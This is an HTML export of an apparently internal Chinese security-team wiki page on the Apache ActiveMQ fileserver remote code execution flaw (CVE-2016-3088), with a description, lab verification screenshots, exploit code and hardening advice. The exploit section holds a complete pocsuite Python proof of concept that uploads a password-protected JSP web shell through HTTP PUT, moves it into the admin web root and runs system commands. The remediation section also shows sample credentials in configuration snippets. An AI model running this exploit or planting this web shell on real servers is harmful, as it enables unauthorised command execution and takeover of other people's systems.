                    
    
                    
    
                    
    
<!DOCTYPE html>
<html>
    <head>
        <title>查看源</title>
        <link rel="canonical" href="/pages/viewpage.action?pageId=$action.page.id" />
        <script>
window.WRM=window.WRM||{};window.WRM._unparsedData=window.WRM._unparsedData||{};window.WRM._unparsedErrors=window.WRM._unparsedErrors||{};
WRM._unparsedData["com.atlassian.plugins.atlassian-plugins-webresource-plugin:context-path.context-path"]="\u0022\u0022";
if(window.WRM._dataArrived)window.WRM._dataArrived();</script>
<link type="text/css" rel="stylesheet" href="/s/a9f9c1d05fab5957eefbeb21808d8348-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/aa5c2abc35d1223b152f0505e791808d/_/download/contextbatch/css/_super/batch.css" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
<!--[if lt IE 9]>
<link type="text/css" rel="stylesheet" href="/s/a9f9c1d05fab5957eefbeb21808d8348-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/aa5c2abc35d1223b152f0505e791808d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lt+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
<![endif]-->
<!--[if lte IE 9]>
<link type="text/css" rel="stylesheet" href="/s/a9f9c1d05fab5957eefbeb21808d8348-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/aa5c2abc35d1223b152f0505e791808d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lte+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
<![endif]-->
<link type="text/css" rel="stylesheet" href="/s/d41d8cd98f00b204e9800998ecf8427e-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/689a949132fabc86eace7102316c5470/_/download/contextbatch/css/plugin.viewsource,-_super/batch.css" data-wrm-key="plugin.viewsource,-_super" data-wrm-batch-type="context" media="all">
<link type="text/css" rel="stylesheet" href="/s/e170a429a3ebc9c551f006bb3a0f6cb3-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/935074d6c663ad510d5b836bbc8ac279/_/download/contextbatch/css/page,-_super/batch.css?build-number=7701" data-wrm-key="page,-_super" data-wrm-batch-type="context" media="all">
<link type="text/css" rel="stylesheet" href="/s/e170a429a3ebc9c551f006bb3a0f6cb3-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/935074d6c663ad510d5b836bbc8ac279/_/download/contextbatch/css/page,-_super/batch.css?build-number=7701&amp;media=print" media="print" data-wrm-key="page,-_super" data-wrm-batch-type="context">
<link type="text/css" rel="stylesheet" href="/s/95887e175e37d26035df520d5cedc3dd-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/04aa6ccd26ebcf7271640afc46404a4e/_/download/contextbatch/css/editor-content,-_super/batch.css?confluence.table.resizable=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
<!--[if lte IE 9]>
<link type="text/css" rel="stylesheet" href="/s/95887e175e37d26035df520d5cedc3dd-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/04aa6ccd26ebcf7271640afc46404a4e/_/download/contextbatch/css/editor-content,-_super/batch.css?conditionalComment=lte+IE+9&amp;confluence.table.resizable=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
<![endif]-->
<link type="text/css" rel="stylesheet" href="/s/62670cd6c46dc9fd1c3fe85280142dff-T/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/5.1.8/_/download/batch/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource.css" data-wrm-key="ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource" data-wrm-batch-type="resource" media="all">

    </head>

    <body class="mceContentBody aui-theme-default wiki-content fullsize">
        <p>&nbsp;</p>         <p><br /></p><h1><span>一. 漏洞简介</span></h1><p><span><span>漏洞描述：</span></span></p><p>ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java 的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用。</p><p>2016年4月14日，国外安全研究人员 Simon Zuckerbraun 曝光 Apache ActiveMQ Fileserver 存在多个安全漏洞，可使远程攻击者用恶意代码替代Web应用，在受影响系统上执行远程代码（CVE-2016-3088）。</p><p><span><span style="color: rgb(26,26,26);letter-spacing: 0.0px;">漏洞评级：严重</span></span></p><p><span style="color: rgb(38,38,38);"><span>参考连接：<a href="https://help.aliyun.com/knowledge_detail/50436.html">https://help.aliyun.com/knowledge_detail/50436.html</a></span></span></p><p><br /></p><h1>二. 利用条件</h1><pre class="prettyprint lang-html prettyprinted"><span style="color: rgb(0,0,0);">ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录</span></pre><h1>三. 漏洞验证</h1><p>本地搭建环境，使用PUT方法构造特殊路径，爆出绝对路径。</p><p><img class="confluence-embedded-image" height="250" src="/download/attachments/61559160/image2018-6-6_10-54-13.png?version=1&amp;modificationDate=1528253653000&amp;api=v2" data-image-src="/download/attachments/61559160/image2018-6-6_10-54-13.png?version=1&amp;modificationDate=1528253653000&amp;api=v2" data-unresolved-comment-count="0" data-linked-resource-id="61560458" data-linked-resource-version="1" data-linked-resource-type="attachment" data-linked-resource-default-alias="image2018-6-6_10-54-13.png" data-base-url="https://confluence.360es.cn" data-linked-resource-content-type="image/png" data-linked-resource-container-id="61559160" data-linked-resource-container-version="4" title="网络安全部公共空间 > ActiveMQ 未授权访问漏洞 > image2018-6-6_10-54-13.png" data-location="网络安全部公共空间 > ActiveMQ 未授权访问漏洞 > image2018-6-6_10-54-13.png" data-image-height="528" data-image-width="1268"></p><p><img class="confluence-embedded-image" height="250" src="/download/attachments/61559160/image2018-6-6_10-54-30.png?version=1&amp;modificationDate=1528253671000&amp;api=v2" data-image-src="/download/attachments/61559160/image2018-6-6_10-54-30.png?version=1&amp;modificationDate=1528253671000&amp;api=v2" data-unresolved-comment-count="0" data-linked-resource-id="61560461" data-linked-resource-version="1" data-linked-resource-type="attachment" data-linked-resource-default-alias="image2018-6-6_10-54-30.png" data-base-url="https://confluence.360es.cn" data-linked-resource-content-type="image/png" data-linked-resource-container-id="61559160" data-linked-resource-container-version="4" title="网络安全部公共空间 > ActiveMQ 未授权访问漏洞 > image2018-6-6_10-54-30.png" data-location="网络安全部公共空间 > ActiveMQ 未授权访问漏洞 > image2018-6-6_10-54-30.png" data-image-height="360" data-image-width="1318"></p><p>先上传一个jsp文件到fileserver目录，因为该目录没有执行权限，然后利用MOVE方法，移动到网站根目录</p><p><img class="confluence-embedded-image confluence-thumbnail" height="250" src="/download/thumbnails/61559160/image2018-6-6_10-54-56.png?version=1&amp;modificationDate=1528253697000&amp;api=v2" data-image-src="/download/attachments/61559160/image2018-6-6_10-54-56.png?version=1&amp;modificationDate=1528253697000&amp;api=v2" data-unresolved-comment-count="0" data-linked-resource-id="61560465" data-linked-resource-version="1" data-linked-resource-type="attachment" data-linked-resource-default-alias="image2018-6-6_10-54-56.png" data-base-url="https://confluence.360es.cn" data-linked-resource-content-type="image/png" data-linked-resource-container-id="61559160" data-linked-resource-container-version="4" title="网络安全部公共空间 > ActiveMQ 未授权访问漏洞 > image2018-6-6_10-54-56.png" data-location="网络安全部公共空间 > ActiveMQ 未授权访问漏洞 > image2018-6-6_10-54-56.png" data-image-height="1170" data-image-width="1082"></p><p><img class="confluence-embedded-image" height="250" src="/download/attachments/61559160/image2018-6-6_10-55-18.png?version=1&amp;modificationDate=1528253718000&amp;api=v2" data-image-src="/download/attachments/61559160/image2018-6-6_10-55-18.png?version=1&amp;modificationDate=1528253718000&amp;api=v2" data-unresolved-comment-count="0" data-linked-resource-id="61560468" data-linked-resource-version="1" data-linked-resource-type="attachment" data-linked-resource-default-alias="image2018-6-6_10-55-18.png" data-base-url="https://confluence.360es.cn" data-linked-resource-content-type="image/png" data-linked-resource-container-id="61559160" data-linked-resource-container-version="4" title="网络安全部公共空间 > ActiveMQ 未授权访问漏洞 > image2018-6-6_10-55-18.png" data-location="网络安全部公共空间 > ActiveMQ 未授权访问漏洞 > image2018-6-6_10-55-18.png" data-image-height="640" data-image-width="2280"></p><p>现在可以访问<a href="http://172.16.214.135:8161/admin/1.jsp?pwd=sec&amp;i=whoami">http://172.16.214.135:8161/admin/1.jsp?pwd=sec&amp;i=whoami</a></p><p><img class="confluence-embedded-image" height="250" src="/download/attachments/61559160/image2018-6-6_10-56-47.png?version=1&amp;modificationDate=1528253807000&amp;api=v2" data-image-src="/download/attachments/61559160/image2018-6-6_10-56-47.png?version=1&amp;modificationDate=1528253807000&amp;api=v2" data-unresolved-comment-count="0" data-linked-resource-id="61560476" data-linked-resource-version="1" data-linked-resource-type="attachment" data-linked-resource-default-alias="image2018-6-6_10-56-47.png" data-base-url="https://confluence.360es.cn" data-linked-resource-content-type="image/png" data-linked-resource-container-id="61559160" data-linked-resource-container-version="4" title="网络安全部公共空间 > ActiveMQ 未授权访问漏洞 > image2018-6-6_10-56-47.png" data-location="网络安全部公共空间 > ActiveMQ 未授权访问漏洞 > image2018-6-6_10-56-47.png" data-image-height="1452" data-image-width="2860"></p><h1>四. 漏洞利用</h1><p><br /></p><table class="wysiwyg-macro" data-macro-name="code" data-macro-id="df0993bb-4554-43db-826d-11503586297c" data-macro-parameters="language=py" data-macro-schema-version="1" style="background-image: url(/plugins/servlet/confluence/placeholder/macro-heading?definition=e2NvZGU6bGFuZ3VhZ2U9cHl9&amp;locale=zh_CN&amp;version=2); background-repeat: no-repeat;" data-macro-body-type="PLAIN_TEXT"><tr><td class="wysiwyg-macro-body"><pre>#这里存放代码
#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

class ActiveMQPOC(POCBase):
    vulID = '32'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2018-06-05' #漏洞公开的时间,不知道就写今天

    author = 'wangqi' #  PoC作者的大名
    createDate = '2018-06-05'# 编写 PoC 的日期
    updateDate = '2018-06-05'# PoC 更新的时间,默认和编写时间一样
    references = 'https://help.aliyun.com/knowledge_detail/50436.html'# 漏洞地址来源,0day不用写
    name = 'ActiveMQ Unauthorized access'# PoC 名称
    appPowerLink = ''# 漏洞厂商主页地址
    appName = 'ActiveMQ'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'Command Execution'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        ActiveMQ 未授权访问漏洞
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    #验证漏洞 pocsuite -r 32-ActiveMQ-unauthorized-access.py -u 127.0.0.1 --verify
    def _verify(self):
        #定义返回结果
        result = {}
        #获取漏洞url
        vul_url = '%s' % self.url
        #如果设置端口则取端口,没有设置则为默认端口
        import re
        from pocsuite.lib.utils.funs import url2ip
        _port = re.findall(':(\d+)\s*', vul_url)
        if len(_port) != 0:
            _host = url2ip(vul_url)[0]
            _port = url2ip(vul_url)[1]
        else :
            _host = url2ip(vul_url)
            _port = '8161'
        url = 'http://%s:%s/admin'%(_host,_port)
        print url
        try:
            res = req.get(url=url, timeout=5, allow_redirects=True)
            print res.status_code
            title = re.findall('&lt;title>(.*)&lt;/title>', res.text)[0]
            if res.status_code == 200 and 'ActiveMQ Console' in title:
                # print title
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Payload'] = url

       
        #检测漏洞
        
        except Exception as e:
            print e

        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
         #定义返回结果
        result = {}
        #获取漏洞url
        vul_url = '%s' % self.url
        #如果设置端口则取端口,没有设置则为默认端口
        import re
        from pocsuite.lib.utils.funs import url2ip
        _port = re.findall(':(\d+)\s*', vul_url)
        if len(_port) != 0:
            _host = url2ip(vul_url)[0]
            _port = url2ip(vul_url)[1]
        else :
            _host = url2ip(vul_url)
            _port = '8161'


       
        #检测漏洞
        url = 'http://%s:%s'%(_host,_port)
        # print url
        try:
            get_fileserver_path_url = url + '/fileserver/%08/..%08/.%08/%08'
            res = req.put(url=get_fileserver_path_url, timeout=5, allow_redirects=False)
            # print res.reason
            path = re.findall(r'/.*?(?=fileserver/.*)', res.reason)[0]
            # print path
            put_jsp_url = url + '/fileserver/haha.jsp'
            jsp_data = '''
                        &lt;%
                if("sec".equals(request.getParameter("pwd"))){
                    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
                    int a = -1;
                    byte[] b = new byte[2048];
                    out.print("&lt;pre>");
                    while((a=in.read(b))!=-1){
                        out.println(new String(b));
                    }
                    out.print("&lt;/pre>");
                }
            %>
            '''
            res = req.put(url=put_jsp_url, timeout=5, allow_redirects=False, data = jsp_data)
            if res.status_code == 204:
                # print 'ok'
                headers = {
                    'Destination': 'file://'+path+'admin/haha.jsp'
                }
                res = req.request('move', url=put_jsp_url, timeout=5, allow_redirects=False, headers=headers)
                if res.status_code == 204:
                    # print 'ok'
                    exploit_url = url + '/admin/haha.jsp?pwd=sec&amp;i=id'
                    res = req.get(url=exploit_url, timeout=5, allow_redirects=False)
                    if 'uid' in res.text:
                        id_info = re.findall(r'(?&lt;=&lt;pre>).*', res.text)[0]
                        print id_info
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['URL'] = self.url
                        result['VerifyInfo']['Payload'] = exploit_url
                    
        except Exception as e:
            print e
        return self.save_output(result)

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(ActiveMQPOC)


</pre></td></tr></table><p><br /></p><h1>五. 解决方案</h1><pre class="prettyprint lang-html prettyprinted"><span style="color: rgb(26,26,26);"><span style="color: rgb(51,51,51);">1.强烈</span><span style="color: rgb(51,51,51);">建议</span><span style="color: rgb(51,51,51);">不要将管理后台开放到互联网上，您可以使用</span><span style="color: rgb(51,51,51);">ECS</span><span style="color: rgb(51,51,51);">安全组策略做好访问控制，默认策略为拒绝所有通信，根据业务发布情况仅开放需要对外用户提供的服务，并控制好访问源IP。</span><span style="color: rgb(51,51,51);"> </span><br /></span></pre><pre class="prettyprint lang-html prettyprinted"><span style="color: rgb(26,26,26);"><span style="color: rgb(51,51,51);"><span style="color: rgb(51,51,51);">2.ActiveMQ分为web控制台的安全配置和队列/主题服务的访问安全配置：</span><span style="color: rgb(51,51,51);"> </span><br /></span></span></pre><pre class="prettyprint lang-html prettyprinted"><span style="color: rgb(26,26,26);"><span style="color: rgb(51,51,51);"><span style="color: rgb(51,51,51);"><span style="color: rgb(51,51,51);">ActiveMQ web管理控制台安全设置 </span><span style="color: rgb(51,51,51);"> </span><br /><span style="color: rgb(51,51,51);">（1）</span><span style="color: rgb(51,51,51);">修改</span><span style="color: rgb(51,51,51);">端口号：</span><span style="color: rgb(51,51,51);"> </span><br /></span></span></span></pre><p><span style="color: rgb(51,51,51);">默认端口8061，采用的JETTY服务器，所以修改端口和密码也是改JETTY的配置jetty.xml、jetty-realm.xml</span><span style="color: rgb(51,51,51);"> </span></p><p>&lt;bean id=&quot;securityConstraint&quot; class=&quot;org.eclipse.jetty.util.security.Constraint&quot;&gt;<br />&lt;property name=&quot;name&quot; value=&quot;BASIC&quot; /&gt;<br />&lt;property name=&quot;roles&quot; value=&quot;admin&quot; /&gt;<br />&lt;property name=&quot;authenticate&quot; value=&quot;true&quot; /&gt;<br />&lt;/bean&gt;</p><p><span style="color: rgb(51,51,51);">第三个属性authenticate要为true.</span></p><p><span style="color: rgb(51,51,51);">（2）在修改用户名和密码</span></p><p><span style="color: rgb(51,51,51);">建议使用十位以上数字+字母+特殊符号的强密码 ；</span><span style="color: rgb(51,51,51);"> </span><br /><span style="color: rgb(51,51,51);"> </span><br /><span style="color: rgb(51,51,51);">控制台的登录用户名密码保存在conf/jetty-realm.properties文件中,内容如下:</span><span style="color: rgb(51,51,51);"> </span></p><p># username: password [,rolename ...]用户名和密码的格式：<br />用户名 : 密码 ,角色名<br /> <br /> <br />parry: parrYd@#1w%6, admin<br />user: user, user</p><p><span style="color: rgb(51,51,51);">设置连接ActiveMQ的用户名和密码</span><span style="color: rgb(51,51,51);"> </span></p><p><span style="color: rgb(51,51,51);">如果不设置ActiveMQ安全机制的话，任何人如果知道我们的ActiveMQ服务的IP、端口和消息地址，都可以接受和发送消息。</span><span style="color: rgb(51,51,51);"> </span><br /><span style="color: rgb(51,51,51);">推荐最简单的配置，在conf/activemq.xml文件的broker标签里的&lt;systemUsage&gt;标签前加入如下内容：</span></p><p>&lt;plugins&gt;<br />    &lt;simpleAuthenticationPlugin&gt;<br />      &lt;users&gt;<br />          &lt;authenticationUser username=&quot;parry&quot; password=&quot;parry123&quot; groups=&quot;users,admins&quot;/&gt;<br />      &lt;/users&gt;<br />    &lt;/simpleAuthenticationPlugin&gt;</p><p><span style="color: rgb(51,51,51);">注意：必须要在&lt;systemUsage&gt;标签前，否则ActiveMQ服务重启会报错。</span><span style="color: rgb(51,51,51);"> </span><br /><span style="color: rgb(51,51,51);"> </span><br /><span style="color: rgb(51,51,51);">所有配置完毕后重启ActiveMQ服务即可。</span><span style="color: rgb(51,51,51);"> </span><br /><span style="color: rgb(51,51,51);">提示：为避免数据丢失，升级前请做好备份，或ECS建立硬盘快照。</span><span style="color: rgb(51,51,51);"> </span></p><p><br /></p><pre class="prettyprint lang-html prettyprinted"><br /></pre>
        <p>&nbsp;</p>
    </body>
</html>
